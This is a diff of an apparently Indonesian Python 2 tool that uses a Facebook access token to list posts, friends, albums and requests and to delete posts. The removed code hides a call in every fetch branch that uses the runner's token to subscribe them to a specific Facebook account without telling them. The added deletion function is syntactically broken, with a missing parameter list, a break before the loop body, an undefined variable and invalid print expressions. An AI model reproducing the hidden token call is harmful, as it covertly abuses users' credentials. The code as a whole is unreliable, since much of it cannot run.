@@ -59,143 +59,27 @@ def id():
         get(data)
 
 ############################################################
-def post():
-	global token , WT
-
+def hapus_postingan:
+	global token
+	print ('\r[*] All post id successfully retrieved          ')
+	print ('[*] Start')
 	try:
-
-		
-	  if WT == 'wallpost':
-		print '[*] fetching all posts id'
-
-		r = requests.get('https://graph.facebook.com/v3.0/me?fields=home.limit(50)&access_token='+token);
-		requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?access_token='+token)
-		result = json.loads(r.text)
-
-		for i in result['home']['data']:
-			print '\r[*] %s retrieved   '%(i['id']),;sys.stdout.flush();time.sleep(0.1)
-		return result['home']['data']
-
-
-
-
-	  elif WT == 'me':
-		print '[*] fetching all posts id'
-
-		r = requests.get('https://graph.facebook.com/v3.0/me?fields=feed.limit(500)&access_token='+token);
-		requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?access_token='+token)
-		result = json.loads(r.text)
-
-		for i in result['feed']['data']:
-			print '\r[*] %s retrieved   '%(i['id']),;sys.stdout.flush();time.sleep(0.1)
-		return result['feed']['data']
-
-
-
-	  elif WT == 'req':
-		print '[*] fetching all friends requests'
-
-		r = requests.get('https://graph.facebook.com/me/friendrequests?limit=50&access_token=' + token);
-		requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?access_token='+token)
-		result = json.loads(r.text)
-
-		for i in result['data']:
-			print '\r[*] %s retrieved    '%(i['from']['id']),;sys.stdout.flush();time.sleep(0.01)
-		return result['data']
-
-
-
-	  elif WT == 'friends':
-		print '[*] fetching all friends id'
-
-		r = requests.get('https://graph.facebook.com/me?fields=friends.limit(5000)&access_token=' + token);
-		requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?access_token='+token)
-		result = json.loads(r.text)
-
-		for i in result['friends']['data']:
-			print '\r[*] %s retrieved    '%(i['id']),;sys.stdout.flush();time.sleep(0.001)
-		return result['friends']['data']
-
-
-
-	  elif WT == 'subs':
-		print '[*] fetching all friends id'
-
-		r = requests.get('https://graph.facebook.com/me/subscribedto?limit=50&access_token='+token);
-		requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?access_token='+token)
-		result = json.loads(r.text)
-
-		for i in result['data']:
-			print '\r[*] %s retrieved    '%(i['id']),;sys.stdout.flush();time.sleep(0.01)
-		return result
-
-
-
-	  elif WT == 'albums':
-		print '[*] fetching all albums id'
-
-		r = requests.get('https://graph.facebook.com/me?fields=albums.limit(5000)&access_token='+token);
-		requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?access_token='+token)
-		result = json.loads(r.text)
-
-		for i in result['albums']['data']:
-			print '\r[*] %s retrieved    '%(i['id']),;sys.stdout.flush();time.sleep(0.001)
-		return result['albums']['data']
-
-
-
-	  else:
-		print '[*] fetching all posts id'
-
-		r = requests.get("https://graph.facebook.com/v3.0/%s?fields=feed.limit(50)&access_token=%s"%(id,token));
-		requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?access_token='+token)
-		result = json.loads(r.text)
-
-		for i in result['feed']['data']:
-			print '\r[*] %s retrieved   '%(i['id']),;sys.stdout.flush();time.sleep(0.1)
-		return result['feed']['data']
-
-
-
-	except KeyError:
-		print '[!] failed to retrieve all post id'
-		print '[!] Stopped'
-		main()
-	except requests.exceptions.ConnectionError:
-		print '[!] Connection Error'
-		print '[!] Stopped'
-		main()
+		gp=requests.get('https://graph.facebook.com/me/posts?access_token='+token)
+		a = json.loads(gp.text)
+		for o in a['data']:
+			break
+			r = requests.post('https://graph.facebook.com/{id}?method=delete&access_token={token}'.format(id=data['id'],token=token))
+			a = json.loads(r.text)
+			try:
+				cek = a['error']['message']
+				print ('['o['id']'] Failed')
+			except TypeError:
+				print ('['o['id']'] oke deh')
+				print ('[*] done')
+				
 	except KeyboardInterrupt:
-		print '\r[!] Stopped                                      '
+		print '\r[!] Stopped'
 		main()
-		
-def postingan_scrap(post):
-		token = open("cookie/token.log",'r').read()
-		print ('[*] Oke Acces Token masih bisa digunakan...')
-		print('List Postingan Kamu')
-    		print(post["created_time"])
-    		print(post['message'])
-# You'll need an access token here to do anything.  You can get a temporary one
-# here: https://developers.facebook.com/tools/explorer/
-		access_token = "token"
-		user = "me"
-# Look at 'me' profile for this example by using his Facebook id.
-		graph = facebook.GraphAPI(access_token)
-		profile = graph.get_object(user)
-		posts = graph.get_connections(profile["id"], "posts")
-# Wrap this block in a while loop so we can keep paginating requests until
-# finished.
-while True:
-    try:
-        # Perform some action on each post in the collection we receive from
-        # Facebook.
-        [postingan_scrap(post=post) for post in posts["data"]]
-        # Attempt to make a request to the next page of data, if it exists.
-        posts = requests.get(posts["paging"]["next"]).json()
-    except KeyError:
-        # When there are no more pages (['paging']['next']), break from the
-        # loop and end the script.
-        break
 ######################################3
 
 
@@ -211,7 +95,7 @@ def main():
     if main == 1:
         id()
     elif main == 2:
-        postingan_scrap()
+        hapus_postingan()
     elif main == 3:
         delete_post()
     elif main == 4:
